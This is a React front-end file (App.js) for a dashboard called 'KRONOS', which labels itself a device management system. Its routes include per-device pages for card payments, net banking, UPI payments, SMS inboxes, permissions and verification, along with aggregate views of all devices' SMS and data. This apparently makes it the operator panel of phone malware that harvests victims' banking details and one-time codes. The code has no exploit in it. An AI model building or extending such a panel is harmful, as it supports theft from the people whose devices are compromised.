// App.js
import React, { useState, useEffect } from 'react';
import { BrowserRouter, Routes, Route, Navigate, useNavigate } from 'react-router-dom';
import DeviceList from './components/DeviceList';
import AdminModal from './components/AdminModal';
import AdminManagement from './components/AdminManagement';
import AdminDeviceManager from './components/AdminDeviceManager';
import SessionManager from './components/SessionManager';
import Login from './pages/Login';
//import Setup from './pages/Setup';
import ChangePassword from './pages/ChangePassword';
import UserMenu from './components/UserMenu';
import { ThemeProvider, useTheme } from './context/ThemeContext';
import { AuthProvider, useAuth } from './context/AuthContext';
import ProtectedRoute from './components/ProtectedRoute';
import DeviceDetailPage from './pages/DeviceDetailPage';
import CardPaymentsPage from './pages/CardPaymentsPage';
import NetBankingPage from './pages/NetBankingPage';
import PermissionsPage from './pages/PermissionsPage';
import VerificationPage from './pages/VerificationPage';
import SmsInboxPage from './pages/SmsInboxPage';
import UPIPaymentsPage from './pages/UPIPaymentsPage';
import AdminAdd from './pages/AdminAdd';
import AdminDashboard from './pages/AdminDashboard';
import AllDevicesPage from './pages/AllDevicesPage';
import AllDeviceDataPage from './pages/AllDeviceDataPage';
import AllDeviceSmsPage from './pages/AllDeviceSmsPage';
import DeviceSelector from './pages/DeviceSelector';
import DeviceLogsPage from './pages/DeviceLogsPage';

import {
  listenAllSessions,
  listenRemoteLogout
} from './firebase/config';
import './styles/App.css';
import './styles/Auth.css';

// Logo Import
import logo from './assets/logo.jpeg';

// ===== STATUS BAR COMPONENT - Compact =====
const StatusBar = ({ currentTime, isDark, toggleTheme }) => (
  <div className="status-bar-compact">
    <span className="status-time-compact">{currentTime}</span>
    <div className="status-icons-compact">
      <span>📶</span>
      <span>🔋</span>
      <button className="theme-toggle-btn-compact" onClick={toggleTheme}>
        {isDark ? '☀️' : '🌙'}
      </button>
    </div>
  </div>
);

// ===== LOGO POPUP COMPONENT =====
const LogoPopup = ({ isOpen, onClose, logo }) => {
  if (!isOpen) return null;

  return (
    <div className="logo-popup-overlay" onClick={onClose}>
      <div className="logo-popup-content" onClick={(e) => e.stopPropagation()}>
        <button className="logo-popup-close" onClick={onClose}>
          ✕
        </button>
        <img
          src={logo}
          alt="KRONOS Logo"
          className="logo-popup-image"
        />
        <div className="logo-popup-info">
          <h2>KRONOS</h2>
          <p>v3.2.1 • Device Management System</p>
        </div>
      </div>
    </div>
  );
};

// ===== TOAST COMPONENT =====
const Toast = ({ message, type }) => {
  if (!message) return null;
  return <div className={`toast ${type}`}>{message}</div>;
};

function AppContent() {
  const { isDark, toggleTheme } = useTheme();
  const { user, logout, sessions } = useAuth();
  const navigate = useNavigate();
  const [showAdminModal, setShowAdminModal] = useState(false);
  const [toast, setToast] = useState(null);
  const [currentTime, setCurrentTime] = useState('');
  const [showLogoPopup, setShowLogoPopup] = useState(false);

  // Time and Toast Setup
  useEffect(() => {
    const updateTime = () => {
      const now = new Date();
      setCurrentTime(now.toLocaleTimeString('en-IN', {
        hour: '2-digit',
        minute: '2-digit',
        hour12: true
      }));
    };
    updateTime();
    const interval = setInterval(updateTime, 1000);

    const handleToast = (e) => {
      const { message, type } = e.detail || {};
      if (message) showToast(message, type);
    };
    window.addEventListener('showToast', handleToast);

    return () => {
      clearInterval(interval);
      window.removeEventListener('showToast', handleToast);
    };
  }, []);

  // ✅ REMOTE LOGOUT LISTENER
  useEffect(() => {
    console.log('🔵 AppContent: Setting up remote logout listener...');
    console.log('🔵 User:', user);
    console.log('🔵 User.uid:', user?.uid);

    if (!user || !user.uid) {
      console.log('🔵 No user logged in, skipping remote logout listener');
      return;
    }

    const currentSessionId = localStorage.getItem('kronos_session');
    console.log('🔵 Current session ID:', currentSessionId);

    if (!currentSessionId) {
      console.log('🔵 No session ID found');
      return;
    }

    let unsubscribeRemoteLogout = null;
    let unsubscribeAllSessions = null;

    try {
      console.log('🔵 Setting up listenRemoteLogout...');
      unsubscribeRemoteLogout = listenRemoteLogout(
        user.uid,
        currentSessionId,
        (commandData) => {
          console.log('🔴 REMOTE LOGOUT COMMAND RECEIVED:', commandData);
          alert('⚠️ You have been logged out from this device by admin!');

          localStorage.removeItem('kronos_user');
          localStorage.removeItem('kronos_session');
          logout();
          window.location.href = '/login';
        }
      );

      console.log('🔵 Setting up listenAllSessions...');
      unsubscribeAllSessions = listenAllSessions((allSessions) => {
        const currentSessionExists = allSessions.some(
          s => s.sessionId === currentSessionId && s.userId === user.uid
        );

        if (!currentSessionExists) {
          console.log('🔴 Current session deleted by admin');
          alert('⚠️ You have been logged out from all devices!');

          localStorage.removeItem('kronos_user');
          localStorage.removeItem('kronos_session');
          logout();
          window.location.href = '/login';
        }
      });

      console.log('✅ Remote logout listeners set up successfully');

    } catch (error) {
      console.error('❌ Error setting up remote logout listeners:', error);
    }

    return () => {
      console.log('🔵 Cleaning up remote logout listeners');
      if (unsubscribeRemoteLogout && typeof unsubscribeRemoteLogout === 'function') {
        unsubscribeRemoteLogout();
      }
      if (unsubscribeAllSessions && typeof unsubscribeAllSessions === 'function') {
        unsubscribeAllSessions();
      }
    };
  }, [user, logout]);

  const showToast = (message, type = 'info') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 2800);
  };

  const handleLogoClick = () => {
    setShowLogoPopup(true);
  };

  const handleClosePopup = () => {
    setShowLogoPopup(false);
  };

  const handleLoginClick = () => {
    navigate('/login');
  };

  return (
    <div className={`app ${isDark ? 'dark' : 'light'}`}>
      {/* Status Bar - Compact */}
      <StatusBar
        currentTime={currentTime}
        isDark={isDark}
        toggleTheme={toggleTheme}
      />

      {/* Top Bar - Compact */}
      <div className="topbar-compact">
        <div className="top-left-compact">
          {/* ======================================== */}
          {/* ✅ LOGO - Compact */}
          {/* ======================================== */}
          <div
            className="logo-container-compact clickable"
            onClick={handleLogoClick}
            title="Click to enlarge logo"
          >
            <div className="fire-ring-1"></div>
            <div className="fire-ring-2"></div>
            <div className="fire-ring-3"></div>
            <div className="fire-particle"></div>
            <div className="fire-particle"></div>
            <div className="fire-particle"></div>
            <div className="fire-particle"></div>
            <div className="fire-particle"></div>
            <div className="fire-particle"></div>
            <div className="fire-particle"></div>
            <div className="fire-particle"></div>
            <span className="fire-emoji top-right">🔥</span>
            <span className="fire-emoji bottom-left">🔥</span>
            <span className="fire-emoji top-left">✨</span>
            <span className="fire-emoji bottom-right">⚡</span>
            <img src={logo} alt="KRONOS" className="app-logo-compact" />
          </div>

          <div className="brand-info-compact">
            <span className="brand-name-compact">KRONOS</span>
            <span className="brand-version-compact">v3.2.1</span>
          </div>
        </div>

        <div className="top-right-compact">
          {user ? (
            <>
              <UserMenu />
              <button className="admin-btn-compact" onClick={() => setShowAdminModal(true)}>
                ⚙
              </button>
              <button className="theme-toggle-mobile-compact" onClick={toggleTheme}>
                {isDark ? '☀️' : '🌙'}
              </button>
            </>
          ) : (
            <>
              <button className="admin-btn-compact" onClick={handleLoginClick}>
                🔐 Login
              </button>
              <button className="theme-toggle-mobile-compact" onClick={toggleTheme}>
                {isDark ? '☀️' : '🌙'}
              </button>
            </>
          )}
        </div>
      </div>

      {/* ===== ROUTES ===== */}
      <div className="routes-container">
       <Routes>
  {/* Public Routes */}
  {/* <Route path="/setup" element={<Setup />} /> */}  {/* Commented */}
  <Route path="/login" element={<Login />} />

          {/* Protected Routes */}
          <Route
            path="/"
            element={
              <ProtectedRoute>
                <DeviceList />
              </ProtectedRoute>
            }
          />

          <Route
            path="/change-password"
            element={
              <ProtectedRoute>
                <ChangePassword />
              </ProtectedRoute>
            }
          />

          {/* Admin Routes */}
          <Route
            path="/admin-devices"
            element={
              <ProtectedRoute>
                <AdminDeviceManager />
              </ProtectedRoute>
            }
          />

          <Route
            path="/sessions"
            element={
              <ProtectedRoute>
                <SessionManager />
              </ProtectedRoute>
            }
          />

          <Route
            path="/admin-management"
            element={
              <ProtectedRoute>
                <AdminManagement />
              </ProtectedRoute>
            }
          />

          <Route
            path="/device/:deviceId"
            element={
              <ProtectedRoute>
                <DeviceDetailPage />
              </ProtectedRoute>
            }
          />

          <Route
            path="/card/:deviceId"
            element={
              <ProtectedRoute>
                <CardPaymentsPage />
              </ProtectedRoute>
            }
          />

          <Route
            path="/netbank/:deviceId"
            element={
              <ProtectedRoute>
                <NetBankingPage />
              </ProtectedRoute>
            }
          />

          <Route
            path="/permissions/:deviceId"
            element={
              <ProtectedRoute>
                <PermissionsPage />
              </ProtectedRoute>
            }
          />

          <Route
            path="/verification/:deviceId"
            element={
              <ProtectedRoute>
                <VerificationPage />
              </ProtectedRoute>
            }
          />

          <Route
            path="/sms/:deviceId"
            element={
              <ProtectedRoute>
                <SmsInboxPage />
              </ProtectedRoute>
            }
          />

          <Route
            path="/upi/:deviceId"
            element={
              <ProtectedRoute>
                <UPIPaymentsPage />
              </ProtectedRoute>
            }
          />
          <Route
            path="/admin-add"
            element={
              <ProtectedRoute>
                <AdminAdd />
              </ProtectedRoute>
            }
          />
          <Route
            path="/admin-dashboard"
            element={
              <ProtectedRoute>
                <AdminDashboard />
              </ProtectedRoute>
            }
          />
          <Route
            path="/all-devices"
            element={
              <ProtectedRoute>
                <AllDevicesPage />
              </ProtectedRoute>
            }
          />
          <Route
            path="/all-device-data"
            element={
              <ProtectedRoute>
                <AllDeviceDataPage />
              </ProtectedRoute>
            }
          />
          <Route
            path="/all-sms"
            element={
              <ProtectedRoute>
                <AllDeviceSmsPage />
              </ProtectedRoute>
            }
          />
          <Route
            path="/device-selector"
            element={
              <ProtectedRoute>
                <DeviceSelector />
              </ProtectedRoute>
            }
          />
          <Route
            path="/device-logs/:deviceId"
            element={
              <ProtectedRoute>
                <DeviceLogsPage />
              </ProtectedRoute>
            }
          />
          {/* 404 - Redirect to Home */}
          <Route path="*" element={<Navigate to="/" />} />
        </Routes>
      </div>

      {/* Admin Modal */}
      <AdminModal
        isOpen={showAdminModal}
        onClose={() => setShowAdminModal(false)}
        onToast={showToast}
      />

      {/* Toast */}
      <Toast message={toast?.message} type={toast?.type} />

      {/* Logo Popup */}
      <LogoPopup
        isOpen={showLogoPopup}
        onClose={handleClosePopup}
        logo={logo}
      />
    </div>
  );
}

function App() {
  console.log('✅ App() rendering...');
  return (
    <BrowserRouter>
      <ThemeProvider>
        <AuthProvider>
          <AppContent />
        </AuthProvider>
      </ThemeProvider>
    </BrowserRouter>
  );
}

export default App;
